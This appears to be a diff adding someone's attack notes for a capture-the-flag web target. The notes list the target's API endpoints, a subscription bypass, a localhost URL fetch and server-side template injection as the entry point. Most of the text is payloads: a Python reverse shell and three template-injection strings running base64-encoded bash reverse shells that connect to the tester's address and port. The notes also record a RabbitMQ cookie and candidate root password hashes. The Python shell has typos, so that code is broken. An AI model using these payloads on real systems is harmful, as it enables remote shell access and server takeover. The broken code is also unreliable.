@@ -1,0 +1,47 @@
+fsubdomain = storage.cloudsite.thm
+
+JWT Alg = HS256
+
+JWT encode hijacking = failed
+Directly adding subscription type on the request = success. 
+
+Upload from URL= http://127.0.0.1:3000/api/docs
+
+X-Forwarded-By = Express -p  3000
+
+POST Requests:
+/api/register - For registering user
+/api/login - For loggin in the user
+/api/upload - For uploading files
+/api/store-url - For uploadion files via url
+/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.
+
+GET Requests:
+/api/uploads/filename - To view the uploaded files
+/dashboard/inactive - Dashboard for inactive user
+/dashboard/active - Dashboard for active user
+
+Possible entry - SSTI 
+
+===python rev to be encoded===
+export RHOST="10.4.14.13";
+export RPORT=9001;
+python3 -c '
+import sys,socket,os,pty;
+s=socket.socket();
+s.connect((os.getenv("RHOST"),int(os.getevn("RPORT))));
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
+pty.spawn("sh)'
+======================
+#STTI #1 = "username":"{{ self.__init__.globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjE0LjEzLzkwMDEgMD4mMQo= |base64 -d |bash'
+).read() }}" FAILED
+#STTI #2 = {"username": "{self.__init__.__globals__.__builtins__.exec('import os;os.system(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjE0LjEzLzkwMDEgMD4mMQo= 
+| base64 -d | sh\")') }}"} FAILED
+#STTI #3 =  {"username": "{{self.__init__.__globals__.__builtins__.exec('import os;os.system(\"echo ZXhwb3J0IFJIT1NUPSIxMC40LjE0LjEzIjtleHBvcnQgUlBPUlQ9OTAwMTtweXRob24zIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KChvcy5nZXRlbnYoIlJIT1NUIiksaW50KG9zLmdldGVudigiUlBPUlQiKSkpKTtbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCJzaCIpJw== | base64 -d | sh\")') }}"}
+
+Rabbitmq COOKIE = cXJ3PKjFz4CyOmXD
+
+#two possible hashes for Root:
+
+#1 = "vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K"
+#2 = "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"
